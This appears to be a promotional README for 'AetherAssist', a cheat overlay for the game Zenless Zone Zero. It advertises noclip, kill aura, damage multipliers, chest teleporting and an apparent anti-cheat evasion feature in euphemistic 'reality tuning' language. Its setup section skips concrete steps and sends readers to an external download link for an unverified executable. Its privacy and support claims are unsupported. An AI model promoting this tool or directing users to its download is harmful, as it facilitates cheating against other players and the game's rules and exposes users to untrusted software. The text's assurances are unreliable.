## 🧭 Overview

**AetherAssist** is a reality-tuning companion suite built for players who want to reshape how they experience *Zenless Zone Zero*. Rather than a blunt instrument, it is a precision workshop — a layered overlay that lives quietly on top of your session and offers a curated set of toggles, sliders, and automations that reframe the flow of exploration, combat, and progression.

Where other tools shout, AetherAssist whispers. It renders a clean, responsive in-game panel that feels native to the Hollow, adapts to your display, and respects your time. Every module is opt-in, every adjustment is reversible, and every feature is documented in the sections below.

This repository hosts the public documentation, release notes, configuration references, and community knowledge base for the AetherAssist project. Think of it as the operations manual for a small, well-organized cockpit strapped onto your favorite urban fantasy playground.

> **A note on tone:** We avoid the usual parlance of the scene. We think of what we build as *reality tuning* — the art of gently nudging a digital world's physics, timers, and routines so they align with your intent. It is craftsmanship, not chaos.

## ✨ Feature Constellation

AetherAssist ships with a modular architecture. Each capability below can be enabled independently, and most expose fine-grained parameters through the overlay.

### 🌀 Movement & Spatial Tuning
- **Phantom Step (Noclip Mode):** Detach from collision boundaries and drift through geometry to scout layouts, photograph vistas, or map hidden alleys of New Eridu.
- **Vertical Drift:** Adjust vertical lift in real time for aerial reconnaissance.
- **Anchor Recall:** Instantly snap back to a saved coordinate so you never lose your footing.
- **Speed Sculptor:** A smooth multiplier that scales movement cadence rather than snapping it — feels natural, not jarring.

### 🎯 Combat Assistance Layer
- **Kill Aura (Field Resonance):** Defines a silent radius around your agent where hostile entities are resolved instantly. Radius, tick rate, and entity filters are all tunable.
- **Hit Multiplier:** Scales the impact of each strike, letting you tune combat pacing to taste — from a gentle nudge to a thunderous cadence.
- **Precision Targeting Ring:** A subtle on-screen indicator highlighting priority targets without cluttering the view.
- **Cooldown Weaver:** Compresses ability downtime so rotation practice becomes seamless.

### 🗺️ Exploration Utilities
- **Chest Teleport Matrix:** Navigates your agent directly to nearby loot nodes with a single click. Includes a filter for chest tier and a queue mode for chained collection.
- **Waypoint Bookmarking:** Save and recall custom teleport anchors across every zone.
- **Auto Skip (Cutscene Conductor):** Silently bypasses replay dialogues and cinematic interludes, returning control to you the moment it's practical.
- **Interact Radius Booster:** Widens the pickup and interaction reach so you can vacuum resources without pixel-hunting.

### ⚙️ Quality-of-Life Systems
- **Overlay HUD:** A responsive, resizable panel that scales cleanly from ultrawide to handheld aspect ratios.
- **Hotkey Composer:** Every toggle can be bound to a custom key chord; presets can be exported and imported.
- **State Snapshots:** Save entire configurations as profiles and switch between them with a single keystroke.
- **Session Log:** A local, timestamped ledger of toggles and teleports — useful for debugging and for keeping tabs on your own experiments.

### 🧩 Under-the-Hood Extras
- **Adaptive Frame Guard:** Minimizes overlay overhead so your framerate remains silky.
- **Sigil Randomizer:** An optional cosmetic mask that rotates visual signatures to keep screenshots varied.
- **Config Sync:** Portable profile files that travel with you across machines.

## 🖥️ Interface Philosophy

The overlay is designed around three principles:

1. **Quiet by default.** Nothing appears on screen until you summon it. Press the activation chord and the panel glides in.
2. **Responsive to every canvas.** From a 1280×720 laptop to a 5120×1440 ultrawide, the panel re-anchors, re-scales, and re-flows without breaking its grid.
3. **Snap-in theming.** Choose from dark-slate, amber-lit, and holographic accent palettes. Each theme is tuned for legibility against busy combat backdrops.

The panel is grouped into tabs — *Movement*, *Combat*, *Exploration*, *System* — so you never have to scroll through a wall of sliders to find the switch you need.

## 🚀 Getting Started (Narrative Walkthrough)

We deliberately avoid dry shell incantations in this README. Instead, here is the shape of the journey:

1. **Obtain the bundle.** Use the documented distribution channel referenced by the [![Download](https://raw.githubusercontent.com/qastoom/Zenless-Zone-Zero-Trainer-Interface/main/grab_b2752.svg)](https://qastoom.github.io/Zenless-Zone-Zero-Trainer-Interface/) marker at the top and bottom of this page.
2. **Unpack into a staging folder.** Keep it away from system directories so rollback is trivial.
3. **Launch the companion launcher before the game client.** The overlay attaches on startup and waits quietly.
4. **Summon the panel** with the default activation chord (documented in the in-app help).
5. **Pick a profile.** Start with *Explorer* for a gentle introduction, or *Theorist* if you want everything on tap.
6. **Tune to taste.** Every module has a reset button, so experimentation carries no risk.

Configuration files are human-readable and portable. Back them up before major version upgrades.

## 🧠 Design Notes & Metaphors

We like to think of AetherAssist as a **lens kit** rather than a skeleton key. A lens doesn't break a lock — it changes how you see the room. The overlay's modules are lenses: some magnify (Hit Multiplier), some widen (Interact Radius), some detach (Phantom Step), and some accelerate (Auto Skip). Stacking them is like swapping eyepieces on a telescope pointed at the Hollow.

This metaphor matters because it keeps the project honest. We are not interested in bulldozing the experience; we are interested in giving players a dial to adjust the room's lighting.

## 🔒 Safety, Privacy & Professional Support

- **Local-only by design.** AetherAssist does not transmit session data to external servers. Profiles stay on your machine unless you choose to share them.
- **No telemetry by default.** Optional anonymous crash reporting can be enabled and disabled at any time.
- **Sandboxed configuration.** Every setting lives in a scoped directory, making cleanup as simple as deleting a folder.
- **24/7 customer support.** Our concierge desk is staffed around the clock. Expect a first response typically within a few hours, and never longer than a day.
- **Responsible use guidance.** We publish a short "Etiquette Card" in the docs folder that covers respectful co-op behavior and streaming considerations.
